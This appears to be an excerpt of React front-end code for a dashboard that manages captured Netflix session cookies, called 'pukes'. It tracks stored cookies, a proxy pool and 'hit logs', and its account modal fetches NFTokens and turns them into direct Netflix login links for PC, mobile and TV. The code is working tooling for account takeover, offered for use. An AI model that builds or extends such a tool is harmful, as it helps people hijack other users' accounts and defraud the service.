    ...
    <div className="p-6 lg:p-8 max-w-7xl mx-auto animate-fade-in">
      ...
      <div className="mb-8 flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
        <div>
          ...
          <p className="text-muted-foreground mt-1">Monitor your NFX puke database in real-time</p>
        </div>
      ...
      <div className="mb-6 flex items-center gap-3 flex-wrap">
        ...
        <div className="flex items-center gap-2 rounded-full bg-secondary px-3 py-1.5 text-xs font-medium text-muted-foreground">
          ...
          Pukes Stored: {totalCookiesStored}
        </div>
        {proxyPool && (
          <div className={cn(
            "flex items-center gap-2 rounded-full px-3 py-1.5 text-xs font-medium",
      ...
      {/* Puke Hit Logs with Search & Filter */}
      <div className="mb-8">
        <div className="flex flex-col gap-4 mb-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <h2 className="text-xl font-semibold">Puke Hit Logs</h2>
        ...
        {loading ? (
          ...
          <Card>
            <CardContent className="flex flex-col items-center justify-center py-12">
              ...
              <p className="text-sm text-muted-foreground">No puke hits stored yet</p>
...
function AccountModal({
  ...
  const [isRechecking, setIsRechecking] = useState(false);
  const [nfTokenLinks, setNfTokenLinks] = useState<Array<[string, string]>>([]);
  const [nfTokenData, setNfTokenData] = useState<{ token: string; expires_at_utc: string } | null>(null);
  const [isFetchingNfToken, setIsFetchingNfToken] = useState(false);

  // Lazily fetch NFToken when the modal opens — the server generates it
  // in the background, so we poll until it's ready (or give up after 3 tries).
  useEffect(() => {
    if (!open || !account) return;
    const storedHitId = account.storedHitId;

    // If the result already has NFToken links, use them directly
    const existingLinks = account.result.nfTokenLinks;
    const existingToken = account.result.nfTokenData;
    if (existingLinks && existingLinks.length > 0) {
      setNfTokenLinks(existingLinks);
      setNfTokenData(existingToken || null);
      return;
    }
    if (existingToken?.token) {
      setNfTokenLinks([
        ["🖥\ufe0f PC Login", `https://netflix.com/?nftoken=${existingToken.token}`],
        ["📱 Mobile Login", `https://netflix.com/unsupported?nftoken=${existingToken.token}`],
        ["📺 TV Login", `https://www.netflix.com/activate?nftoken=${existingToken.token}`],
      ]);
      setNfTokenData(existingToken);
      return;
    }

    // No token yet — poll the server. The background generation may still be in progress.
    setNfTokenLinks([]);
    setNfTokenData(null);
    let cancelled = false;
    let attempts = 0;

    const pollNfToken = async () => {
      if (cancelled || !storedHitId) return;
      setIsFetchingNfToken(true);
      try {
        // Wait a bit for background generation to complete before first poll
        if (attempts === 0) await new Promise((r) => setTimeout(r, 3000));
        const data = await fetchNfToken(storedHitId);
        if (cancelled) return;
        if (data.nftoken && data.links.length > 0) {
          setNfTokenLinks(data.links);
          setNfTokenData(data.nftoken);
          setIsFetchingNfToken(false);
          return;
        }
        // Token not ready yet — retry up to 3 times with 4s delay
        attempts++;
        if (attempts < 3) {
          setTimeout(pollNfToken, 4000);
        } else {
          setIsFetchingNfToken(false);
        }
      } catch {
      ...
      <div className="flex-1 min-h-0 overflow-hidden">
        <ScrollArea className="h-full">
          <div className="p-3 sm:p-4 space-y-3">
            ...
            {isFetchingNfToken && nfTokenLinks.length === 0 && (
              <div className="flex items-center gap-2 rounded-lg bg-primary/5 p-2.5 border border-primary/20">
                <Loader2 className="h-4 w-4 text-primary animate-spin shrink-0" />
                <span className="text-xs text-muted-foreground">Generating login links…</span>
              </div>
            )}
            ...
            {nfTokenLinks.length > 0 && (
              <div className="space-y-2">
                ...
                {nfTokenData?.expires_at_utc && (
                  <p className="text-[10px] text-muted-foreground">
                    NFToken expires: {nfTokenData.expires_at_utc}
                  </p>
                )}
              </div>
            )}
            ...
            <div className="space-y-0.5">
              ...
              {accountEntries.length === 0 && (
                <p className="text-xs text-muted-foreground">
                  No additional account information was captured for this puke.
                </p>
              )}
            </div>
          </div>
